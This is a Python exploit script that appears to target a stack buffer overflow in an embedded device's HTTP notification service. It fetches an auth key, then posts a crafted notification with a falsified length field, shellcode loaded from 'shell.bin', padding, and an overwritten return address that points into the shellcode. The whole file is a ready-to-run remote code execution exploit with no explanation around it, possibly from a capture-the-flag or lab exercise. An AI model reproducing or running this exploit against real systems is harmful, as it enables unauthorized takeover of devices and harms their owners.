#!/usr/bin/env python3
from __future__ import print_function
from sys import argv, stderr
import os
import requests
import struct

SERVER_ADDR = "192.168.1.1:8000"
STACK_POINTER = 0x2000DE00

url = 'http://%s/auth' % (SERVER_ADDR)
r = requests.get(url)
if r.status_code != 200:
    exit(1)
authKey = struct.unpack('I', r.content)[0]

url = 'http://%s/notification?auth=%x' % (SERVER_ADDR, authKey)

username = "Evil"
message = "Hi! "
desiredLen = 280

notification = struct.pack('I', len(username))
notification += bytes(username, 'utf-8')
notification += struct.pack('I', desiredLen - 12)
notification += bytes(message, 'utf-8')
if len(notification) != 16:
    print("Wrong length")
    exit(1)

# add terminal zero to message string
notification += b'\x00' * 4

shell_offset = len(notification)

shell = open("shell.bin", 'rb').read()
notification += shell

notification += b'\x00' * (desiredLen - len(notification) - 4)
notification += struct.pack('I', STACK_POINTER - (desiredLen - shell_offset) + 1)
if len(notification) != desiredLen:
    print("Wrong length")
    exit(1)

requests.post(url=url, data=notification, headers={'Content-Type': 'application/octet-stream'})